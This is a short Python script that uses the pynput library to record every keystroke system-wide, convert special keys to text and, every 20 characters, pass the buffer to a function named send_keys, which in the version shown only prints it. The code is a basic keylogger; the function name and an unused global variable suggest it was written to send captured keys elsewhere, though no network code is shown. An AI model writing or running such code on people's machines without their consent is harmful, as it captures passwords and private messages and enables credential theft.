from pynput.keyboard import Listener

keys = ''

def send_keys():
    global keys
    global last_send
    print(keys)
    keys = ''

def on_press(key):
    global keys
    str_key = str(key)
    if str_key == "Key.tab":
        str_key = '\t'
    elif str_key == "Key.enter":
        str_key = '\n'
    elif str_key == "Key.space":
        str_key = ' '
    elif str_key == "Key.backspace":
        str_key = ' bspace '
    elif "Key" in str_key:
        str_key = str_key.replace("Key.", "")
        str_key = f" {str_key} "
    keys += str_key.strip('\'')
    if len(keys) >= 20:
        send_keys()

with Listener(on_press=on_press) as listener:
    listener.join()
